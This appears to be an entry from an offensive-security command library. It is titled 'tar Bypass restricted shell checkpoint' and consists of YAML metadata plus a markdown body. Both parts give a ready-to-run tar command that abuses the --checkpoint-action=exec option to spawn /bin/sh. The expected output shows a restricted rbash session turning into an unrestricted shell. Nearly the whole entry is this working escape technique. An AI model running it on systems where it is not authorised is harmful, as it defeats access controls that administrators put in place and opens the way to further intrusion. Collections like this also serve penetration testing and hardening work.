---
id: 73c34385-49df-4d6c-a2cc-f1d0425389d9
name: tar Bypass restricted shell checkpoint
type: command
executor: ''
data: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
output: 'method@hacker:~$ echo $0

  rbash

  method@hacker:~$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

  $ echo $0

  /bin/sh

  '
created_at: '2019-09-19T17:03:16.223988+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# tar Bypass restricted shell checkpoint

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

## Expected Output

```
method@hacker:~$ echo $0
rbash
method@hacker:~$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
$ echo $0
/bin/sh

```
